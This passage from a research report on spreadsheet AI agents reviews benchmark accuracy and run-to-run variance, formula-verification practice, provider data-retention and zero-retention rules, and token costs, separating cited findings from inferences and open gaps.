Best-published results come from agents that compute with a real engine and read back results rather than reasoning about numbers; even so, top agents fail roughly 9 percent of the easier verified benchmark tasks and about 65 percent of end-to-end business workflow tasks, and run-to-run variance is several points. Verification has to be built into the loop and an internal regression suite has to be run multiple times before trusting a change.

### Cited Findings

**Benchmarks and published accuracy**
- SpreadsheetBench 2 (paper June 2026; leaderboard dated 26 March 2026): 321 tasks covering generation, debugging and visualization. Best model Claude Opus 4.6 at 34.89 percent overall, then GPT-5.2 at 26.79 percent and Gemini 3.1 Pro at 23.68 percent; lowest listed MiniMax M2.5 at 7.17 percent; debugging as low as 12.00 percent. All evaluated on a bash-agent scaffold (search summary). — [SpreadsheetBench site](https://spreadsheetbench.github.io), [SpreadsheetBench 2 paper summary](https://www.emergentmind.com/papers/2606.29955)
- Original SpreadsheetBench (V1): 912 tasks scraped from Excel forums, with a verified 400-task subset released late 2025. Gemini in Google Sheets reported 70.48 percent on the full set; the verified leaderboard tops out around 94.75 percent. V1 and V2 scores are not comparable (search summary). — [benchmarklist V1 verified](https://benchmarklist.com/benchmarks/spreadsheetbench_v1_verified/), [SpreadsheetBench paper](https://arxiv.org/html/2406.14991v2)
- GRID, 27 July 2026 (fetched, vendor self-report): its agent scored 91.25 percent on the verified 400 set with claude-sonnet-5. Across seven full runs: best 91.25, median 90.75. claude-opus-4-8: best 91.0, median 90.5 (2 runs). claude-sonnet-4-6: best 90.0, median 89.0 (7 runs). claude-sonnet-4-5: best 86.75, median 85.6 (6 runs). A typical run fails 35 to 45 of 400 tasks. The agent started around 75 percent. — [GRID engineering blog](https://grid.is/blog/an-agent-with-a-spreadsheet-engine-beats-one-without)
- Variance (GRID): with temperature 0 and top_k 1, 12 of 100 sampled tasks flipped between pass and fail across five runs on sonnet-4-6 and 14 of 100 across four runs on sonnet-4-5. 14 tasks failed in all seven sonnet-5 runs, but 96.5 percent passed at least once. Re-running only failed tasks raised a score to 85.7 percent but a later full re-run erased the gain. Conclusion: single-run differences of a point or two are mostly noise. — [GRID engineering blog](https://grid.is/blog/an-agent-with-a-spreadsheet-engine-beats-one-without)
- GRID's stated limitation of the benchmark: cell-level comparison does not score formatting and only suits tasks with fixed answer positions; some tasks have multiple valid solutions; three tasks never passed in any run and are arguably defective. The claim that an engine-equipped agent beats one without is argued qualitatively; no controlled no-engine baseline is reported. — [GRID engineering blog](https://grid.is/blog/an-agent-with-a-spreadsheet-engine-beats-one-without)

**Compute with code/engine, use formulas, show the work** (fetched)
- GRID's verification loop: evaluate a candidate formula against the live workbook before writing it, fill down, then read back computed values. Example: a circular reference caused by a `MAX` range that included the formula's own row was fixed by narrowing `B$7:B377` to `B$7:B322` and evaluating in place. — [GRID engineering blog](https://grid.is/blog/an-agent-with-a-spreadsheet-engine-beats-one-without)
- Anthropic xlsx skill: write formulas, not Python-computed results (`sheet['B10'] = '=SUM(B2:B9)'`, not `1234.56`), so the sheet recalculates when inputs change. Put each assumption in its own labelled cell and reference it (`=B5*(1+$B$6)`, never `=B5*1.05`). — [Anthropic xlsx skill](https://github.com/anthropics/skills/blob/main/skills/xlsx/SKILL.md)
- "Write 2-3 formulas first and confirm they return the values you expect before building the full grid." Keep formulas consistent across projection periods: "A single edited cell mid-row is a common silent error." Guard zero denominators. — [Anthropic xlsx skill](https://github.com/anthropics/skills/blob/main/skills/xlsx/SKILL.md)
- Document every assumption and hardcoded number where the reader will see it, with a real source citation (e.g. "Source: Company 10-K, FY2024, Page 45, [URL]"), or state that the user supplied it. — [Anthropic xlsx skill](https://github.com/anthropics/skills/blob/main/skills/xlsx/SKILL.md)
- Compatibility traps that produce wrong or broken output: six newer functions need the `_xlfn.` prefix (TEXTJOIN, CONCAT, IFS, SWITCH, MAXIFS, MINIFS) or they yield `#NAME?`; the skill says never to use XLOOKUP, XMATCH, SORT, FILTER, UNIQUE or SEQUENCE and to use INDEX/MATCH instead; sheet names with spaces must be quoted or yield `#VALUE!`; every formula needs an explicit `number_format` or dates display as serials such as 45337; percentages must be stored as fractions (0.15, not 15). — [Anthropic xlsx skill](https://github.com/anthropics/skills/blob/main/skills/xlsx/SKILL.md)
- "Follow the user's spec literally: exact tab names, column headers, and any formula they specified. A 'better' design that computes something else fails." — [Anthropic xlsx skill](https://github.com/anthropics/skills/blob/main/skills/xlsx/SKILL.md)
- Claude for Excel returns answers with cell-level citations that navigate to the referenced cell. — [Claude for Excel docs](https://claude.com/docs/office-agents/excel)

**Evaluation harness practice (GRID)** (fetched)
- Run multiple full evaluations to measure variance before comparing agent versions; use a representative 100-task subset for frequent iteration and full 400-task runs for higher-fidelity checks; score tasks in parallel while a run is in progress; publish full transcripts and output files; treat the public benchmark as a regression suite rather than a precise leaderboard metric. — [GRID engineering blog](https://grid.is/blog/an-agent-with-a-spreadsheet-engine-beats-one-without)

### Inferences
- Rule for the agent's system prompt and harness: no number in a final answer or cell may originate from the model's own arithmetic; it must come from executed code or an evaluated formula, and the final message should quote the code output or cell reference it came from.
- Two independent computations catch the "clean but wrong" class: compute a total with a formula and with pandas and compare; reconcile sub-totals to grand totals; test a formula on rows with known answers.
- LibreOffice recalculation is not Excel: dynamic-array and newer functions are not evaluated, which is why the skill bans them. An agent that must support modern Excel functions needs Excel itself or a commercial engine for recalculation, or must disclose unverified cells.
- A private regression set should include the team's own workbook types (merged headers, multi-table sheets, hidden sheets, locale-specific dates and decimal commas, very wide files, .xls and .xlsm), be scored on values plus structure plus formatting, and each release should be evaluated at least three times given the roughly 12 to 14 percent per-task flip rate.
- With about 9 percent residual failure on comparatively simple forum tasks and about 65 percent on end-to-end workflows, human review of deliverables remains necessary, which matches Anthropic's "not recommended ... without human review" wording.

### Gaps
- No published controlled comparison of "LLM mental arithmetic vs code execution" accuracy on spreadsheet tasks was found in this session.
- No controlled measurement of the benefit of a spreadsheet engine versus openpyxl-only was published by GRID.
- I did not open the SpreadsheetBench 2 paper; its numbers come from search digests of the project site and paper summaries.
- No published evaluation harness specifically for data-integrity (round-trip preservation) or for prompt-injection resistance of spreadsheet agents was found.
- Microsoft's and Google's own published accuracy figures for Copilot in Excel / Gemini in Sheets beyond the single 70.48 percent Gemini claim were not found.

## 6. Privacy and compliance: PII and financial data sent to LLM APIs

### Takeaway
The tools that make a spreadsheet agent convenient (uploaded files, server-side code execution, batch) are the ones excluded from zero-data-retention arrangements at both Anthropic and OpenAI. For sensitive workbooks, run code in your own sandbox and send the model only schema and the minimum necessary values inline; otherwise accept and document up-to-30-day retention.

### Cited Findings

**Anthropic** (fetched, official docs)
- Retained data is never used for model training without express permission. — [Anthropic API and data retention](https://platform.claude.com/docs/en/manage-claude/api-and-data-retention)
- The page states conversation content is not retained by default under the arrangements it covers, with the exception of "Covered Models", which require 30-day retention. — [Anthropic API and data retention](https://platform.claude.com/docs/en/manage-claude/api-and-data-retention)
- ZDR applies to the Messages and Token Counting APIs only for features marked eligible. Not eligible for ZDR or HIPAA: code execution tool (container data retained up to 30 days), programmatic tool calling (same), Files API (files retained until explicitly deleted or until their configured expiration), Batch API (29-day retention). — [Anthropic API and data retention](https://platform.claude.com/docs/en/manage-claude/api-and-data-retention)
- Eligible for ZDR and HIPAA: prompt caching (prompts and outputs not stored; KV cache representations and cryptographic hashes held in memory for the cache TTL) and PDFs sent inline through the Messages API (not through the Files API). — [Anthropic API and data retention](https://platform.claude.com/docs/en/manage-claude/api-and-data-retention)
- Using a non-eligible feature is not blocked: "Using them is a choice to step outside your ZDR arrangement for that specific data." — [Anthropic API and data retention](https://platform.claude.com/docs/en/manage-claude/api-and-data-retention)
- Even with ZDR or HIPAA, data flagged by automated trust and safety systems may be retained for up to 2 years, and data may be retained where required by law. — [Anthropic API and data retention](https://platform.claude.com/docs/en/manage-claude/api-and-data-retention)
- Scope: the page covers the Claude API, Claude Platform on AWS, Anthropic-managed Claude on Google Cloud, and Claude in Microsoft Foundry. On Amazon Bedrock and Google-managed Claude on Google Cloud the cloud provider is the data processor. — [Anthropic API and data retention](https://platform.claude.com/docs/en/manage-claude/api-and-data-retention)
- Code execution container data "including execution artifacts, uploaded files, and outputs, is retained for up to 30 days". — [Claude code execution tool docs](https://platform.claude.com/docs/en/agents-and-tools/tool-use/code-execution-tool)
- Data residency: `inference_geo: "us"` on Claude 4.6 and later models applies a 1.1x price multiplier. — [Anthropic pricing](https://platform.claude.com/docs/en/about-claude/pricing)
- Claude for Excel add-in: inputs and outputs deleted from the backend within 30 days; conversations, workbook content Claude reads and attached files are sent to Anthropic; chat history is stored locally in IndexedDB and clearing it does not delete Anthropic's copy; the add-in does not inherit an organization's custom retention settings; it can be routed through Amazon Bedrock, Google Cloud Vertex AI, Azure AI Foundry or an LLM gateway. — [Claude for Excel docs](https://claude.com/docs/office-agents/excel)
- A news report dated 19 August 2026 is headlined "OpenAI previews zero-retention safety system as Anthropic requires data logs" (search summary; consistent with the "Covered Models require 30-day retention" line above, but details not read). — [Axios](https://axios.com/2026/08/19/openai-previews-zero-retention-safety-system-as-anthropic-requires-data-logs)

**OpenAI** (fetched, official docs)
- API data is not used to train or improve models unless the customer opts in. Abuse-monitoring logs are retained for up to 30 days by default. — [OpenAI "Your data" guide](https://developers.openai.com/api/docs/guides/your-data)
- Zero Data Retention and Modified Abuse Monitoring require prior approval by OpenAI; ZDR forces `store=false` on `/v1/responses` and `/v1/chat/completions`. — [OpenAI "Your data" guide](https://developers.openai.com/api/docs/guides/your-data)
- Not ZDR-compatible: Files, Batches, Vector stores, Assistants/Threads/Runs, Conversations, Evals, Fine-tuning. Files are kept until deleted (or `expires_after`). Hosted containers used by Code Interpreter may hold temporary state on the container filesystem, deleted when the container expires or is deleted. — [OpenAI "Your data" guide](https://developers.openai.com/api/docs/guides/your-data)

**Google Gemini API** (fetched, official docs)
- Project logs have a default maximum retention of 55 days, configurable to 7, 14, 28 or 55 days. Logging is on by default for Interactions API calls and for Generate Content calls in projects created on or after 26 October 2026; owners can turn it off. — [Gemini API logs policy](https://aistudio.google.com/docs/logs-policy)
- For billing-enabled projects, prompts and responses in logs are not used for product improvement by default; datasets voluntarily shared with Google are processed under "Unpaid Services" terms and may be used for training. The page does not mention a zero-data-retention option and does not state an abuse-monitoring retention period. — [Gemini API logs policy](https://aistudio.google.com/docs/logs-policy)

### Inferences
- Architecture choice drives compliance posture: (a) provider-hosted code execution with file upload means the whole workbook sits at the provider for up to 30 days and ZDR does not apply; (b) self-hosted sandbox plus Messages API means only what the agent prints into context leaves your boundary, and ZDR can apply.
- In architecture (b) the harness can enforce minimization: send column names, dtypes, row counts and aggregates; cap rows printed; mask or tokenize identifier columns (names, emails, account numbers, national IDs) before any sample reaches the model and re-map after; run a PII detector over tool output before it is appended to context.
- If files are uploaded, set expirations and delete them explicitly after the task; record deletion in the audit log.
- Fully local processing (local model, or cloud-provider-hosted models under the customer's existing cloud data-processing terms) is the remaining option when no third-party retention is acceptable; Anthropic's docs confirm the processor changes to the cloud provider on Bedrock and Google-managed Vertex.
- Prompt caching does not weaken a ZDR posture according to Anthropic's eligibility table.

### Gaps
- Anthropic's standard commercial retention period for API inputs/outputs outside ZDR, and which models are "Covered Models", were not read in this session (the linked privacy-center article was not opened).
- Google's abuse-monitoring retention period for the paid Gemini API is not stated on the page read; a 55-day abuse-monitoring figure appears only in third-party sources, and Vertex AI ZDR terms were not checked.
- No vendor-published guidance specific to redacting PII in spreadsheets was found; no evaluation of PII-masking tools (e.g. Presidio) on tabular data was retrieved.
- Regulatory specifics (GDPR, HIPAA BAA scope, SOX, PCI) were not researched beyond the HIPAA eligibility column in Anthropic's table.

## 7. Cost and scale: keeping tabular data out of context

### Takeaway
Tabular data is token-expensive and models answer worse as more of it is inlined; the standard pattern is to keep the file in the sandbox and let the model see schema, a few sample rows and code results. No vendor publishes an authoritative cost-per-spreadsheet-task figure; cost has to be estimated from token prices, caching multipliers and measured token counts.

### Cited Findings

**Token cost of table formats**
- TQA-Bench (arXiv 2411.19504): token cost varies widely by serialization for the same database; CSV is the most token-efficient of the four formats tested and HTML needs nearly three times as many tokens, while Markdown consistently yields better performance for most LLMs (search summary). — [TQA-Bench](https://arxiv.org/pdf/2411.19504)
- One practitioner test of 1,000 employee records across 11 formats: CSV used the fewest tokens (19,524) but had the worst accuracy (44.3 percent); a Markdown key-value layout used 2.7 times more tokens (52,104) and had the best accuracy (60.7 percent) (search summary; single informal test). — [SoftServe on Medium](https://medium.com/softserve-technical-communication/rethinking-llm-inputs-json-against-toon-and-markdown-kv-b713bcbe7eb5)
- A SQL-result encoding comparison reports Markdown tables using 24 percent fewer tokens than NDJSON (9,621 vs 12,305) (search summary). — [mcp-ohmy-sql docs](https://mcp-ohmy-sql.readthedocs.io/en/stable/_sources/04-Developer-Guide/08-Design-Patterns/Query-Result-Encoding/index.rst.txt)

**Anthropic prices as of November 2026** (fetched, official pricing page; USD per million tokens, input / output)
- Claude Fable 5.2: $8 / $40. Claude Opus 5.5: $4 / $20. Claude Opus 5 and Opus 4.8: $5 / $25. Claude Sonnet 5.5 and Sonnet 5: $2 / $10. Claude Sonnet 4.6: $3 / $15. Claude Haiku 5.5: $0.10 / $0.50 for prompts up to 100,000 tokens and $0.50 / $2.50 above that. Claude Haiku 4.5: $1 / $5. — [Anthropic pricing](https://platform.claude.com/docs/en/about-claude/pricing)
- Prompt caching: 5-minute cache write is 1.25x base input; 1-hour write is 2x (e.g. Sonnet 5: $2.50 and $4); cache reads are 0.1x on most models and 0.025x on Fable/Mythos 5.1 and 5.2; a 5-minute write pays for itself after one read. — [Anthropic pricing](https://platform.claude.com/docs/en/about-claude/pricing)
- Batch API: 50 percent discount on input and output tokens; multipliers stack with caching and data-residency modifiers. — [Anthropic pricing](https://platform.claude.com/docs/en/about-claude/pricing)
- Code execution: 1,550 free hours per organization per month, then $0.05 per container-hour. — [Claude code execution tool docs](https://platform.claude.com/docs/en/agents-and-tools/tool-use/code-execution-tool)

**Operational observations**
- GRID: spreadsheets are a "token-heavy workload"; Sonnet is about 40 percent cheaper than Opus and scored within a point of it (Opus 4.8 91.0 percent vs Sonnet 5 90.0 percent on the same agent build), so they chose Sonnet. No per-task cost or token counts are published. — [GRID engineering blog](https://grid.is/blog/an-agent-with-a-spreadsheet-engine-beats-one-without)
- Anthropic's web search/web fetch tools filter results inside the code-execution environment before they reach the context window ("dynamic filtering"), an official instance of the process-in-sandbox, return-only-results pattern. — [Claude code execution tool docs](https://platform.claude.com/docs/en/agents-and-tools/tool-use/code-execution-tool)
- Claude for Excel auto-compacts long conversations into new ones to avoid exhausting context. — [Claude for Excel docs](https://claude.com/docs/office-agents/excel)
- Claude Haiku 5.5 charges five times more per token once a prompt exceeds 100,000 tokens, a direct penalty for inlining large tables. — [Anthropic pricing](https://platform.claude.com/docs/en/about-claude/pricing)

### Inferences
- Worked example from the cited figures: 1,000 rows of a narrow employee table cost about 19,500 tokens as CSV, so 100,000 such rows would be roughly 2 million tokens, beyond practical context and about $4 of input per request on Sonnet 5 at $2 per million, repeated every turn. Schema plus 5 to 20 sample rows plus `df.describe()` output is typically a few hundred to a few thousand tokens.
- Recommended context policy: first tool call profiles the workbook (sheets, dimensions, header rows, dtypes, null counts, formula counts, merged ranges, named ranges); the model queries by code thereafter; tool outputs are truncated to a row/character cap with an explicit "N more rows" marker; full results go to files, not context.
- Put stable content (system prompt, tool definitions, workbook profile) first and cache it; in a multi-turn agent loop most input tokens are then billed at 0.1x. Per-turn changing data goes after the cache breakpoint.
- Use Batch (50 percent off) for non-interactive bulk jobs, noting it is outside ZDR (section 6).
- Route by difficulty: a cheap model for profiling and simple transforms, a stronger one for multi-sheet modelling and debugging, given the 4x to 80x price spread across the current line-up.
- If rows must be inlined, CSV is cheapest but Markdown-style layouts are reported to be read more accurately; for small critical tables prefer accuracy, for large ones do not inline at all.

### Gaps
- No vendor or engineering team was found to have published a typical cost-per-task figure for spreadsheet agents; GRID explicitly omits it.
- Token-format studies cited are either academic on older models or informal blog tests; none uses the late-2026 model generation.
- OpenAI and Google current token prices and caching discounts were not retrieved.
- No published data on tokens consumed per SpreadsheetBench task by any agent.
- Long-context pricing rules for Anthropic models other than Haiku 5.5 were not checked.
